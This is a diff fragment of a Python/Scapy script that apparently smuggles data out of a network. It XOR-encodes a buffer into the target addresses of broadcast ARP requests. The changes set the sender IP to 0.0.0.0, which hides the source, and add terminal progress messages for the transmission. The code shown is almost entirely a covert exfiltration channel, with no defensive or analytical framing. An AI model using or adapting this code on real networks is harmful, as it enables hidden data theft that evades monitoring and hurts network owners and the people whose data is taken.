@@ -78,7 +78,7 @@ if not direct:
 	send(ARP(op=1, psrc="10.101.7.149", pdst=dip))
 
 MAC_SRC = '70:10:6f:8f:03:00'  #'c4:9d:ed:2a:df:46'
-IP_SRC = '10.101.15.254'
+IP_SRC = '0.0.0.0'
 
 if direct:
  while True:
@@ -88,11 +88,14 @@ if direct:
    buf.append(0)
    length=length+1
 
+  print("\033[s\033[1;0H\u001b[41mTRANSMITTING...              ")
+
   for i in range(0,length,2):
+   print("\033[1;20H"+str(round((i/length)*100))+"%")
    dip = construct_ip([0xFF,0xFE,buf[i]^KEY[0],buf[i+1]^KEY[1]])
    sendp(Ether(src=MAC_SRC,dst='ff:ff:ff:ff:ff:ff') / ARP(op=1, psrc=IP_SRC, pdst=dip,hwsrc=MAC_SRC,hwdst='00:00:00:00:00:00') /Raw(load="\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"),verbose=0)
 
   dip = construct_ip([0xFF,0xFF,0x00,0x00])
   sendp(Ether(src=MAC_SRC,dst='ff:ff:ff:ff:ff:ff') / ARP(op=1, psrc=IP_SRC, pdst=dip,hwsrc=MAC_SRC,hwdst='00:00:00:00:00:00') / Raw(load="\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"),verbose=0)
 
-
+  print("\033[1;0H\u001b[42mDONE.                        \033[u\033[1A\u001b[0m")
